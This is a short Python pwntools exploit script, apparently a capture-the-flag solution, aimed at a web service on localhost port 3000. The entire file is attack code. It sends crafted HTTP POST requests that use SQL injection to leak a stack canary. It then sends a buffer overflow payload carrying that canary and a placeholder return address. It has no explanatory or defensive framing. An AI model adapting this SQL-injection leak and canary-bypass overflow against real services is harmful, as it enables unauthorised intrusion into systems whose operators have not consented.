from pwn import *
context.log_level = "DEBUG"
p = remote("127.0.0.1", 3000)
data = '''POST /product.html HTTP/1.1
Host: 192.168.5.235:3000
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: %d\r\n\r\n%s'''


if __name__ == "__main__":
	# leak
	post_data = "id=5&id=-1 union select '%s',2,3,4&id=7" % ("1"*0x79)
	p.send(data%(len(post_data), post_data))
	p.readuntil("cargo_id cargo_name cargo_attribute price")
	print "="*100
	print p.readline()
	print p.readline()
	canary = u64(p.recv(1024)[0x78:0x80])&0xffffffffffffff00
	print hex(canary)
	# bof
	payload = "1"*0x78 + p64(canary) + "1"*0x18 + p64(12345678)
	post_data = "id=5&id=-1 union select '%s',2,3,4&id=7" % (payload)
	p.send(data%(len(post_data), post_data))
	
	#p.interactive()
